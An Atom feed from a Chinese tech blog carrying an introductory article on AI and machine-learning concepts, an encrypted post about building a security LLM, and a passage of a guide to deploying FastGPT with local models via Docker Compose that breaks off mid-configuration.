<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ColdSnap の Blog</title>
  
  <subtitle>「凛冬将至」</subtitle>
  <link href="https://coldwave96.github.io/atom.xml" rel="self"/>
  
  <link href="https://coldwave96.github.io/"/>
  <updated>2024-10-08T10:58:36.000Z</updated>
  <id>https://coldwave96.github.io/</id>
  
  <author>
    <name>ColdSnap</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SecGPT 基础知识（一）</title>
    <link href="https://coldwave96.github.io/2024/10/08/SecGPT1/"/>
    <id>https://coldwave96.github.io/2024/10/08/SecGPT1/</id>
    <published>2024-10-08T10:58:36.000Z</published>
    <updated>2024-10-08T10:58:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>2023 年科技圈“最靓的仔”非 ChatGPT 莫属，它是大语言模型（Large Language Model，LLM，简称大模型）的一种，而 AI（Artificial Intelligence，人工智能）也再次成为业界热议的话题，并引发了资本领域的狂欢。但若不是专业领域出身的同学，面对机器学习、神经网络、决策式 AI、生成式 AI、大模型、GPT 等一堆概念的时候，很可能搞不清楚它们之间的层次关系，这将不利于对大模型的学习和理解。因此，有必要从宏观上先对 AI 基础知识进行一些介绍。</p><span id="more"></span><h1 id="早期发展：符号人工智能（Symbolic-AI）"><a href="#早期发展：符号人工智能（Symbolic-AI）" class="headerlink" title="早期发展：符号人工智能（Symbolic AI）"></a>早期发展：符号人工智能（Symbolic AI）</h1><p>AI 作为计算机科学的一个分支，大概出现在20世纪50年代，核心目的是让计算机能够像人类一样思考、学习、推理、决策、交流，更好地帮助人类解决复杂的问题，变得更加有用。</p><p>从 50 年代到 80 年代中前期，是 AI 发展的早期阶段，也称为“符号人工智能（Symbolic AI）”。所谓“符号”，可以简单的理解为语句和规则。这个时期计算机的智能性主要依赖于领域专家和程序员将现实生活中的知识转换为规则，然后进行编程实现（比如一条规则可能就对应一组 if…else…的代码），而大量规则则就形成了一个知识库，可用于计算机的推断和决策。因此，“符号人工智能”也被称为“基于规则的人工智能”。</p><p>在 AI 发展的早期阶段，符号人工智能曾经发挥过重要作用，典型代表如 IBM Watson System（医生机器人专家系统）。但随着人工智能的发展，它的局限性也逐渐被人们更深刻的认识到，核心问题在于它非常依赖系统构建者的专业领域知识，需要大量的手工编码来构建和维护复杂的知识库，难以处理那些模糊性的问题。符号人工智能的优点和局限如下表所示：</p><table><thead><tr><th align="left">做的还行</th><th align="left">不太行</th></tr></thead><tbody><tr><td align="left">在人类已知的、广泛的、通用的领域中解决问题、制定决策、满足约束，如领域专家系统、辅助编程系统等</td><td align="left">过于依赖专家经验的转化，复杂的代码开发和维护，边际效应日趋降低</td></tr><tr><td align="left"></td><td align="left">在自然语言处理、语音处理、视觉处理等领域，没有取得明显的效果</td></tr><tr><td align="left"></td><td align="left">系统很难知道经验边界之外的事情，难以做出合理、准确的预测</td></tr><tr><td align="left"></td><td align="left">大部分算法不是分布式的，难以扩展；即使考虑了分布式，也受限于当时的软件、硬件和网络能力</td></tr></tbody></table><p>随着各个业务领域信息技术的快速发展，这种局限性体现得越来越明显，性价比也越来越低，因此符号人工智能获得的研究资金日益减少，社会对 Al 也从狂热的追捧变为冷淡的唏嘘，AI 的发展进入了瓶颈期。不过，符号人工智能作为经典的 AI 技术，通过对人类知识进行规则化的转换，能较好地帮助研究者深入理解人类知识的表示和处理方法，仍然具有学术上的研究价值。</p><p>穷则思变，一种新的方法随即被提出，取代了符号人工智能，并逐渐成为人工智能领域的主流方法，这就是“机器学习”。</p><h1 id="主流方法：机器学习（Machine-Learning）"><a href="#主流方法：机器学习（Machine-Learning）" class="headerlink" title="主流方法：机器学习（Machine Learning）"></a>主流方法：机器学习（Machine Learning）</h1><p>机器学习 （Machine Learning，ML），是人工智能的一个发展分支，出现于上世纪 80 年代中后期，并逐渐成为 AI 领域的主流方法。它的核心思想是让计算机从数据中学习（训练）规律和模式，然后在实际的任务中进行计算、预測、决策、优化，是一种“数据驱动的人工智能”。数提是机器学习的核心要素之一，可以是结构化（如SQL 数据库中的二维表），也可以是非结构化或半结构化（如文本、HTML、XML、语音、图像等）。平时我们常常提到的“神经网络”“深度学习”“有监督““无监督”“卷积网络”“分类”“聚类”“大模型”等诸多概念，其实都属于机器学习这个领域。</p><p>一般可以通过如下的维度来看待机器学习：</p><ul><li>发展阶段的维度：如统计机器学习阶段、神经网络机器学习阶段、大语言模型机器学习阶段等。</li><li>任务目标的维度：如分类、聚类、回归、排名、降维、优化、密度估计等。</li><li>训练方法的维度：如有监督学习、无监督学习、半监督学习、基于人类反馈的强化学习等。</li><li>学习算法的维度：如线性回归、逻辑回归、决策树、K-means 聚类、支持向量机（SVM）、卷积神经网络（CNN）、循环神经网络（RNN）、朴素贝叶斯等。</li><li>模型原理维度：如几何模型、逻辑模型、网络模型、概率模型等。</li></ul><h2 id="发展阶段维度"><a href="#发展阶段维度" class="headerlink" title="发展阶段维度"></a>发展阶段维度</h2><p>机器学习是一个不断发展的过程，每个发展阶段都有其独特的特点和里程碑。虽然发展阶段并没有完全一致的划分原则，但按照“统计机器学习”“神经网络机器学习”和“大语言模型”这三个阶段来划分一般不会引起太大的争议。</p><ul><li>统计机器学习 Statistical Al<ul><li>它是一种基于概率和统计理论的机器学习方法，利用统计学原理，对数据进行分析和建模，用于预测未来趋势和行为。</li><li>应用大量数据来训练模型，通过统计学技术来进行模式识别和预测，如朴素贝叶斯、决策树等，广泛应用于文本分类、图像识别等任务。</li></ul></li><li>神经网络机器学习 Deep Learning<ul><li>它是一种基于人工神经网络的机器学习方法，自 21 世纪初期得到快速发展，Google AlphaGo 将基于神经网络的机器学习推向了高潮。神经网络通过模拟人类的神经系统，从训练数据中抽取特征进行学习和预测，广泛应用于图像分析、语音识别、自然语言处理等各种任务场景中。</li><li>通过构建深层神经网络模型，实现了对复杂的、非线性关系的建模能力，如 CNN、RNN、LSTM 等，在图像识别、语音识别和 NLP 等领域取得显著成果。</li></ul></li><li>大语言模型 LLM&#x2F;GPT<ul><li>它实际上是神经网络的一个发展分支，也是机器学习的最新阶段，自 2020 年左右开始得到快速发展，并因 ChatGPT 而间名于世。当前的主流大模型主要基于 Transformer 架构 （Transformer 是 Google 在 2017 年发表的“Attention is allyou need”论文中提出的一种神经网络架构），一股拥有超大规模的参致，基于超大规模的数据进行训练和学习，在各种类型的自然语言处理任务中（如问答系统、语言翻译、情感分析、命名实体识别等）取得令人惊叹的效果，尤其是文本生成类任务，目前已进一步扩展到音频、图像、视频等领域，被认为是实现通用人工智能（Artificial General Intelligence，AGI）的最可能技术路线。</li><li>基于 Transformer 架构，基于大规模语料进行训练、微调和提示工程，强大的语义理解和生成能力，应用于文本生成、情感识别、机器翻译等各类 NLP 任务。</li></ul></li></ul><p>不过，用“阶段”这个词可能会让人误以为早期阶段的技术已经不再发展，这是一种误解。实际上它们各自仍在发展中，而且都有广泛的应用和前景。在不同领域和任务中，也有着不同的优点和劣势，需要根据具体的问题，以及拥有怎样的数据，来选择合适的方法和技术。</p><h2 id="任务目标维度"><a href="#任务目标维度" class="headerlink" title="任务目标维度"></a>任务目标维度</h2><p>所谓任务目标，就是我们想要利用机器学习去解决什么类型的问题，完成什么类型的任务。问题和任务不同，适用的模型和算法往往也不同，下面以分类、聚类、回归几种任务目标为例来介绍，其他不过多展开了。</p><h3 id="分类和聚类"><a href="#分类和聚类" class="headerlink" title="分类和聚类"></a>分类和聚类</h3><p>“分类”和“聚类”是两个常见的任务类型。</p><ul><li>分类：根掘祥本已知的特征风性，将样本在已有既定的分类规则下进行归类。适用于分类任务的代表算法如逻辑回归、决策树、朴素贝叶斯等。</li><li>聚类：根据样本已知的特征属性，将样本在没有既定的分类规则下进行归类。适用于聚类任务的代表算法如 K-means 等。</li></ul><p>在机器学习和数据科学中，还有几个与分类&#x2F;聚类强相关的基础性概念。</p><ul><li>样本（Sample）：样本是从总体数据中抽取的部分个体数据，是用来训练模型、推断总体特性的一个有限的数据集合，可进一步分为“有标签样本”和“无标签样本”。在数据结构方面，结构化、非结构化、半结构化均有可能。</li><li>特征（Feature）：特征用于描述或表征样本在不同维度上的信息，代表了数据的内在规律，也称为属性，是模型的输入部分。特征的选择对于模型的表现往往有着至关重要的影响。</li><li>标签（Label）：标签是希望模型预测或学习的目标变量，是每个样本的已知结果或类别归属，通常用于有监督学习任务的训练和验证，是模型的输出部分。</li><li>数据集（Dataset）：效据集可以理解为样本的集合，通常由一系列记录组成，每个记录包含若干特征和零个、一个或多个标签。数据集能够进一步细分为训练数据集、验证数据集、测试数据集等。</li></ul><p>模型的训练就是根据已知样本的特征与标签之间的关系构建出一个预测模型；而模型的推理则是使用该预测模型基于来知样本的特征进行标签预测。</p><center>    <img src="/img/SecGPT1/FrCL3XyJcjhf-ZNd5480PglSR9mQ.png" width="850"></center><p>基于上图给出的这个数据集，我们看看分类和聚类的任务有何不同。</p><ul><li>分类任务：请根据以上数据集，对每位同学进行挂科与否的分类。其中，分类规则是明确的：1）总成绩低于60分，归类到“挂科”类别中；2）总成绩高于60分，归类到“没挂”类别中；3）总成绩&#x3D;0.5”平时成绩+0.5”期末成绩。</li></ul><center>    <img src="/img/SecGPT1/Fuk2W7T_ukBCNjyDcSZInm7wnGM9.pngyJcjhf-ZNd5480PglSR9mQ.png" width="850"></center><ul><li>聚类任务：请根据以上数据集，请把各位同学分到不同的小组中。注意，现在只有成绩数据，却没有明确的分类规则的，该如何归类呢？不同的人可能会有不同的归类方法，比如下图中就可能会因为“学霸&#x2F;学渣”和“有救&#x2F;没救”的原则，把每个同学分到不同的组。</li></ul><center>    <img src="/img/SecGPT1/FhW8nJ0HoMxCQE9HnDLT2D-QrJlu.png" width="850"></center><h3 id="回归"><a href="#回归" class="headerlink" title="回归"></a>回归</h3><p>分类和聚类，本质上其实都是对事物进行归类。用数学语言描述，就是把空间&#x2F;平面中一个个的点划分到不同的集合中，是一种处理离散型的随机变量问题。但现实生活中还有一些任务，此如预测房价、股价、温度、雨量等，这类任务是根据已有的数据和经验来预测未来的目标结果，用数学语言描述，是对因变量（结果）和自变量（原因）之间的关系进行建模，基于一个或多个自变量的变化来预测因变量的变化，在坐标轴上体现为直线、曲线、区域等图形，是一种处理连续型随机变量的问题，这类任务叫做回归。网上有一句有点拗口但比较精辟的总结：<strong>回归线是一条线或曲线，它穿过目标预测图上的所有数据点，以使数据点和回归线之间的垂直距离最小。</strong></p><p>回归也有多种类型，对应不同的算法：</p><ul><li>线性回归：对自变量和因变量建立一种线性的关系模型。</li><li>逻辑回归：对自变量和因变量建立一种S型函数或 Logistic 函数的关系模型。</li><li>决策树回归：构建一棵决策树（比如二叉树）。一个样本从根节点（root）出发，一定会走到某一个叶子节点，而叶子节点的值则代表这棵决策树对这个样本的预测结果。</li><li>随机森林回归：创建了一个森林，并使它拥有某种方式的随机性。“森林”是更多“树”的集成，随机森林回归可以看作更大范图、更复杂多变的决策树回归的集成。</li></ul><center>    <img src="/img/SecGPT1/FqS0AfEoZ4VTndET4wZ9A6g93GOi.png" width="850"></center><p>特别说明一下，逻辑回归和决策树回归也常常应用到分类任务中。除了上述提到的这些回归算法，还有多项式回归、支持向量机回归等其他算法，不再展开。</p><h2 id="训练方法维度"><a href="#训练方法维度" class="headerlink" title="训练方法维度"></a>训练方法维度</h2><p>所谓训练方法，就是我们让机器如何从浩瀚的数据中学习到有用的知识和规律，这和人类自身的学习过程有很多相似之处。不同的任务要求和数据特征，可能要采用不同的训练方法，或者多种训练方法的组合。</p><h3 id="有监督学习（Supervised-Learning）"><a href="#有监督学习（Supervised-Learning）" class="headerlink" title="有监督学习（Supervised Learning）"></a>有监督学习（Supervised Learning）</h3><p>有监督学习是基于有属性标签的样本数据进行模型训练。标签的本质是表征样本教据和目标结果之间的联系，训练的过程就是要提取出样本数据的特征，根据标签建立特征值和目标结果的函数映射关系。通过这种不断地学习和训练过程，让这种映射越来越准确（即拟合的越来越好），最终实现对新数据进行预测。有监督学习的主要挑战是获取具有准确标签信息的样本数据，对训练样本的标注往往需要花费大量人工成本。</p><p>有监督学习通常用在分类和回归任务中。</p><ul><li>分类任务场景：比如识别垃圾短信和垃圾邮件，都是先通过对一些历史短信和邮件做垃圾分类的标记，然后基于这些带有标记的数据进行模型训练。训练结束后，当获取到新的短信或是新的邮件时，就可以让模型进行分析和匹配，来识别此短信或邮件是或是不是垃圾类别。</li><li>回归任务场景：比如要预测公司的净利润，可以通过历史上公司的利润值，以及跟利润相关的指标因子，比如营业收入、资产负债、管理费用等，训练出利润与因子的回归模型。训练结束后，输入新的指标因子来预测公司的利润。</li></ul><h3 id="无监督学习（Unsupervised-Learning）"><a href="#无监督学习（Unsupervised-Learning）" class="headerlink" title="无监督学习（Unsupervised Learning）"></a>无监督学习（Unsupervised Learning）</h3><p>无监督学习是基于无标签的样本数据进行模型训练。和有监督学习不同，由于样本数据没有预定的标签信息，模型只好自行寻找数据在不同维度上的内在规律。打个不完全恰当的比喻，有监督学习可以比作“科班出身”或“黄埔军校”，无监督学习则可以比作“野路子”或“土八路”，但“土八路”的战斗力可未必弱于“黄埔军校”。另外，正是因为不需要对训练样本数据打标签，相对有监督学习，数据的获取成本比较低，当然致数据质量也更难保证。</p><p>无监督学习常用在聚类任务上。比如通过客户的消费行为（消费次数、最近消费时间、消费金额）指标，来对客户数据进行分层归类：</p><ul><li>第一类，重要价值客户，潜在特征是最近消费时间近、消费频次和消费金额都很高。</li><li>第二类，重要保持客户，潜在特征是最近消费时间较远，但消费频次和金额都很高，说明这是个一段时间没来的忠诚客户，需要主动和他保持联系。</li><li>第三类，重要发展客户，潜在特征是最近消费时间较近、消费金额高，但频次不高，忠诚度可能不高，算是有潜力的用户，应该重点发展。</li><li>第四类，重要挽留客户，潜在特征是最近消费时间较远、消费频次不高，但历史消费金额高，可能是将要流失或者已经要流失的用户，应该启动挽留措施。</li></ul><p>以上这些可用于分类的潜在特征，不是人为提前设定好的，而是由模型算法根据历史数据自己学习到了某种规律，这是无监督学习最重要的特点。</p><h3 id="半监督学习（Semi-Supervised-Learning）"><a href="#半监督学习（Semi-Supervised-Learning）" class="headerlink" title="半监督学习（Semi-Supervised Learning）"></a>半监督学习（Semi-Supervised Learning）</h3><p>半监督学习是有监督学习和无监督学习相互结合的一种训练方法，实现更优的分类，回归和聚类效果。在实际使用中，可以首先通过无监督学习对训练样本进行基于内在特征规律的聚类。以降低人工进行分类的成本。然后，基于聚类后的数据进行标注，让模型再进行有监督的训练，生成最终的预测模型。通过将两种训练方式进行结合，取得更均衡的成本和效果表现。</p><p>举一个在数据安全领域的应用方式。在《中华人民共和国数据安全法》、《数据安全能力成熟度模型》（GB&#x2F;T-37988）、以及政府、金融、交通、运营商等多个行业规范中，都要求对数据基于分类分级的保护。传统的数据分类分级方式主要基于人工来对数据的类别和级别进行标注。但在实际生产环境中，数据规模是巨大的，而且还在持续高速增长中，依靠人工进行分类分级的难度非常高，效率也比较低。因此，可以考虑基于半监督学习的方法训练一个分类分级的机器学习模型出来，用模型提升分类分级工作的效事。训练方法如下：</p><ul><li>第一步，准备训练样本集，目前以关系型数据为主。</li><li>第二步，通过无监督学习，根据数据内容对相似特征的数据进行自动聚类。</li><li>第三步，接下来数据工程师可以介入了，对聚类后的数据进行批量标注，标注后的数据就能进行有监督的学习了，构建生成数据分类分级的标签推荐模型。</li><li>第四步，将分类分级标签推荐模型部署在生产环境中，扫描出生产数据作为模型输入，最终输出分类分级标签的推荐信息。</li></ul><p>这是半监督学习的一个应用实例，这个过程本质就是通过机器学习把数据分类分级工作中的人工消耗尽可能降低，并提升分类分级标签标注的准确性。</p><h3 id="强化学习（Reinforcement-Learning）"><a href="#强化学习（Reinforcement-Learning）" class="headerlink" title="强化学习（Reinforcement Learning）"></a>强化学习（Reinforcement Learning）</h3><p>强化学习，特别是基于人类反馈的强化学习 （RLHF, Reinforcement Learning from Human Feedback），是一种更复杂、更综合的训练方法，它强调让模型与外界不断进行交互和反馈，通过某种预设的奖励信号（尤其是人类对预测结果的优劣评判），来诱导训练的方向，优化模型的预测和决策效果。强化学习经常用于博弈类游戏（如AlphaGo），无人驾驶、机器翻译、聊天机器人等场景。</p><p>2022年，OpenAI 发表了一篇论文 - 《Training language models to follow instructions with human feedback (结合人类反馈信息来训练语言模型使其能理解指令）》，专门阐述了 RLHF 对 GPT 模型训练的价值。在此之前，传统的语言模型通常只能生成符合语法规则的句子，但内容未必非常符合用户的意图、价值观或表达习惯，说白了就是“不像人话”。为了解决这个问题，于是便引入一种基于人类的反馈来微调语言模型的方法，以更好地遵循用户的意图、指令、偏好、价值观，生成更准确、更有逻辑和连贯性、更具可读性的输出。ChatGPT 所带来的惊人效果，更似人类的表现，使得 RLHF 引起了业界的广泛关注。</p><p>以上四种训练方式的基本思路，汇总如下图所示：</p><center>    <img src="/img/SecGPT1/FvbVFMHCor-irGHd6OJSnW-SKval.png" width="850"></center><h2 id="学习算法维度"><a href="#学习算法维度" class="headerlink" title="学习算法维度"></a>学习算法维度</h2><p>计算机算法指的是一系列明确定义的和可计算的步骤，用于解决特定的问题或执行特定的任务。那么，机器学习算法就是从数据中学习和构建出一种规律和模式，来实现分类、聚类、回归等各式各样的目标任务。机器学习的算法非常丰富，常见如线性回归、逻辑回归、决策树、K-means聚类、支持向量机（SVM）、卷积神经网络（CNN）、循环神经网络（RNN）、朴素贝叶斯等。选择何种算法，需要根据具体的问题类型、数据类型、数据量级、计算资源等因素进行选择。使用不合适的算法，可能难以取得理想的效果。</p><p>那么，在实际应用中如何选择不同的学习算法呢？一般可以参考几个方面，但一定不要绝对地来看：</p><ul><li>问题类型：比如分类问题，往往可以选择辑回归、决策树、K-means 等算法；如果是回归类问题，线性回归就是常用的算法。</li><li>数据类型：比如数据是图像，可以选择 CNN；如果数据是序列致据，则可以选择 RNN 或 LSTM。</li><li>数据量：一般来说，比如随机森林、线性回归这样的算法就比较适合大数据量的处理，而支持向量机、K-means 这样的算法则更适合小数据样本。</li><li>计算资源：一般来说，复杂的算法需要更多的计算资源，例如使用了神经网络结构的算法；简单的算法需要的计算资源较少，例如线性回归或逻辑回归。</li><li>训练时间：有些算法的训练时间很长，例如神经网络；有些算法的训练时间较短，例如线性回归。这有时候会影响我们对算法的选择。</li><li>模型解释性：有时候需要一个可以解释的模型，以便可以更容易地理解模型的决策过程，在这种情况下，我们可能会选择决策树或线性回归等可以提供解释的算法。</li></ul><h2 id="模型原理维度"><a href="#模型原理维度" class="headerlink" title="模型原理维度"></a>模型原理维度</h2><p>这个维度指的是根据几何学、逻辑学、统计学、概率论、网络结构等不同的学术原理设计出不同的模型。</p><ul><li>几何模型：基于几何学原理的模型，可以用于描述和分析空间中的物体或现象之间的关系。比如线性回归模型可以用于预测两个变量之间的关系，基于几何距离的聚类算法可以用于图像分割和目标识别等。</li><li>逻辑模型：基于逻辑学原理的模型，可以用于描述和分析事件之间的逻辑关系（比如“因为……所以……”就是一种典型的因果逻辑）。逻辑模型可以用于知识表示、推理和决策等领域。比如布尔逻辑模型（二分类、多分类、决策树）常常用于分类问题。</li><li>概率模型：基于概率论原理的模型，可以用于描述和分析随机事件之间的概率关系。概率模型可以用于概率推理、贝叶斯统计、自然语言处理等领域。比如贝叶斯网络可以用于分类和回归问题，而马尔可夫链可以用于自然语言处理中的语言模型和机器翻译等。</li><li>网络模型：基于网络结构的模型，可以用于描述和分析复杂系统中的相互作用和关系。比如社交网络分析中的图模型可以用于分析用户之间的联系和影响，知识图谱中的图模型可以用于表示实体之间的关系和语义信息等，神经网络或深度神经网络则广泛应用于自然语言处理、图形处理、语音处理等领域中。</li></ul><p>我们对上述划分方式有一个大致的了解即可。这里单独说说网络模型中的神经网络结构，当下已经广泛使用的 CNN、LSTM、RNN，以及大模型时代的 Transformer，都属于神经网络结构。神经网络 （Neural Networks，NN）通过对人类大脑神经元网络的模拟实现对信息的处理。神经网络由大量的节点（也称为神经元）相互连接而成，节点接收输入井被激活来输出信号，而节点与节点之间的连接则实现了信息的传递。</p><p>最简单的神经网络是感知机，它是一个有着若干输入和一个输出的模型，如下图所示：</p><center>    <img src="/img/SecGPT1/Fqj5gfg3iFz_5vQOkZZvruCw9vj0.png" width="850"></center><p>首先，输入和输出之间是一种线性关系，线性函数形式为：</p><center>    <img src="/img/SecGPT1/Fnfz9PKbw2bwTXLFEN-QNo80Gzxr.png" width="850"></center><p>然后，输出结果再经过一个神经元激活函数，最终得到1或-1两个结果，激活函致形式为：</p><center>    <img src="/img/SecGPT1/FhMupWTrp9lVfd8JswUEuCdNW5UO.png" width="850"></center><p>但这个模型只能用于“非此即彼”的二元分类，无法用于复杂的非线性处理。于是在感知机模型的基础上扩展形成更复杂的神经网络，主要做了几件事：</p><ol><li>在输入层和输出层之间增加一个隐藏层，对输入数据进行非线性变换，模型的学习能力和知识实际上就体现在隐藏层中。</li><li>输出层不止一个神经元，可以有多个输出，让模型可以更灵活应用在分类、聚类、回归、降维等多种任务。</li><li>优化了激活函数，比如使用逻辑回归常用的 Sigmoid 函数替代简单但处理能力有限的Sign函数。然而，除了Sigmoid，还可以使用 Softmax、ReLU、tanh （x）函数等作为神经元激活函数。</li></ol><p>于是，神经网络就从简单的感知机变成下面这个更复杂的结构：</p><center>    <img src="/img/SecGPT1/FnJZOOj2vEUGseNSZ402Igrm5262.png" width="850"></center><p>为了进一步优化神经网络的能力，又出现了更复杂的深度神经网络结构（Deep Neural Networks，DNN），可以理解为拥有很多隐藏层的神经网络。DNN 中一般第一层为输入层，最后一层为输出层，中间都是隐藏层，如下图所示：</p><center>    <img src="/img/SecGPT1/Fgck0Lj1DnE7mSKddokykwJFOQ3_.png" width="850"></center><p>如果该神经网络中第 i 层的任意一个神经元节点，都与第 i+1 层的任意一个神经元节点相连接，这被称为全连接神经网络。虽然它看起来很复杂，但局部其实都是一个个的感知机，均由一个线性函数加上一个激活函数构成。一般情况下，深度神经网络的隐藏层越多，它能够学习和表示的复杂模式就越多，但所消耗的资源也越大。神经元之间的连接传递的信息就是权重 wi，神经网络可以通过训练对权重进行调节，换句话说，模型训练的核心工作就是调节权重。权重对是神经网络至关重要，模型的知识就蕴含在这些权重之中。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;2023 年科技圈“最靓的仔”非 ChatGPT 莫属，它是大语言模型（Large Language Model，LLM，简称大模型）的一种，而 AI（Artificial Intelligence，人工智能）也再次成为业界热议的话题，并引发了资本领域的狂欢。但若不是专业领域出身的同学，面对机器学习、神经网络、决策式 AI、生成式 AI、大模型、GPT 等一堆概念的时候，很可能搞不清楚它们之间的层次关系，这将不利于对大模型的学习和理解。因此，有必要从宏观上先对 AI 基础知识进行一些介绍。&lt;/p&gt;</summary>
    
    
    
    <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/Theories/AI/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>Framework of building SecLLM</title>
    <link href="https://coldwave96.github.io/2024/03/31/SecLLM/"/>
    <id>https://coldwave96.github.io/2024/03/31/SecLLM/</id>
    <published>2024-03-31T00:39:36.000Z</published>
    <updated>2024-03-31T00:39:36.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="76c98cdc7d91de20522fc44778703b119acb9844399c977a4224afa33eeecd53"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/Theories/AI/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>基于本地大模型的 FastGPT 框架部署</title>
    <link href="https://coldwave96.github.io/2024/03/08/FastGPT/"/>
    <id>https://coldwave96.github.io/2024/03/08/FastGPT/</id>
    <published>2024-03-08T12:27:35.000Z</published>
    <updated>2024-03-08T12:27:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://fastgpt.in/">FastGPT</a> 是一款强大的 LLM + RAG 解决方案，本文记录了基于本地大模型搭建 FastGPT 框架的过程。</p><span id="more"></span><h1 id="整体框架说明"><a href="#整体框架说明" class="headerlink" title="整体框架说明"></a>整体框架说明</h1><center>    <img src="/img/FastGPT/sealos-fastgpt.png" width="850"></center><ul><li>整体框架由 4 部分组成，分别为数据库、FastGPT、OneAPI、大模型</li></ul><h2 id="FastGPT"><a href="#FastGPT" class="headerlink" title="FastGPT"></a>FastGPT</h2><ul><li>框架本体，默认使用 OpenAI 的大模型接口</li></ul><h3 id="开发组件依赖"><a href="#开发组件依赖" class="headerlink" title="开发组件依赖"></a>开发组件依赖</h3><ul><li>Docker</li><li>Node.js v18.x</li><li>pnmp 版本 8.x.x</li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul><li><p>MongoDB 用于存储 FastGPT 框架运行所需的数据</p></li><li><p>pgvector 用于存储知识库向量</p><table><thead><tr><th>环境</th><th>最低配置（单节点）</th><th>推荐配置</th></tr></thead><tbody><tr><td>测试</td><td>2c2g</td><td>2c4g</td></tr><tr><td>100w 组向量</td><td>4c8g 50GB</td><td>4c16g 50GB</td></tr><tr><td>500w 组向量</td><td>8c32g 200GB</td><td>16c64g 200GB</td></tr></tbody></table></li></ul><h2 id="OneAPI"><a href="#OneAPI" class="headerlink" title="OneAPI"></a>OneAPI</h2><ul><li>OneAPI 是大模型调用接口框架，负责对接大模型调用接口，提供权限控制和收费统计等功能</li></ul><h2 id="本地大模型"><a href="#本地大模型" class="headerlink" title="本地大模型"></a>本地大模型</h2><ul><li>提供的本地大模型接口需要符合 OpenAI 的接口规范</li><li>综合显存需求<ul><li>最少：32GB+</li><li>推荐：48GB+</li></ul></li></ul><h3 id="对话大模型"><a href="#对话大模型" class="headerlink" title="对话大模型"></a>对话大模型</h3><ul><li>Baichuan 2</li><li>ChatGLM 2&#x2F;3</li></ul><h3 id="Embedding-模型"><a href="#Embedding-模型" class="headerlink" title="Embedding 模型"></a>Embedding 模型</h3><ul><li>m3e-large</li></ul><h3 id="ReRank-模型"><a href="#ReRank-模型" class="headerlink" title="ReRank 模型"></a>ReRank 模型</h3><ul><li>bge-reranker-large</li></ul><h1 id="基于-Docker-Compose-的快速部署"><a href="#基于-Docker-Compose-的快速部署" class="headerlink" title="基于 Docker Compose 的快速部署"></a>基于 Docker Compose 的快速部署</h1><h2 id="部署本地模型-OneAPI"><a href="#部署本地模型-OneAPI" class="headerlink" title="部署本地模型 + OneAPI"></a>部署本地模型 + OneAPI</h2><ul><li><p>部署实例中使用的本地模型组合为 Baichuan2-7B-Chat + M3E-large + BGE-ReRanker-base</p></li><li><p>硬件资源和前置需求见下方分布式部署相关章节</p></li><li><p>在本地创建文件夹并下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> llm</span><br><span class="line"><span class="built_in">cd</span> llm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载 docker-compose.yml 文件</span></span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-DockerCompose/docker-compose.yml</span><br></pre></td></tr></table></figure></li><li><p>根据<code>docker-compose.yml</code>文件中的提示修改对应的信息</p></li><li><p>通过以下命令控制相关容器</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">docker compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止</span></span><br><span class="line">docker compose down</span><br></pre></td></tr></table></figure></li></ul><h2 id="配置-OneAPI"><a href="#配置-OneAPI" class="headerlink" title="配置 OneAPI"></a>配置 OneAPI</h2><ul><li>登陆<code>http://&lt;gpu_server_ip&gt;:8000</code>，初始账号密码<code>root/123456</code> ，登陆成功后及时修改默认密码</li><li>点击<code>令牌</code>→<code>添加新的令牌</code>，输入名称，内部使用可设置<code>永不过期 + 设置无限额度</code></li><li>回到<code>令牌</code>，点击<code>复制</code>即可获取<code>Token</code></li><li>点击<code>渠道</code>→<code>添加新的渠道</code><ul><li>添加 Baichuan2-7B-Chat<ul><li>类型：<code>OpenAI</code></li><li>名称：<code>Baichuan2-7B-Chat</code>（随意）</li><li>模型：<code>Baichuan2-7B-Chat</code>（随意，FastGPT 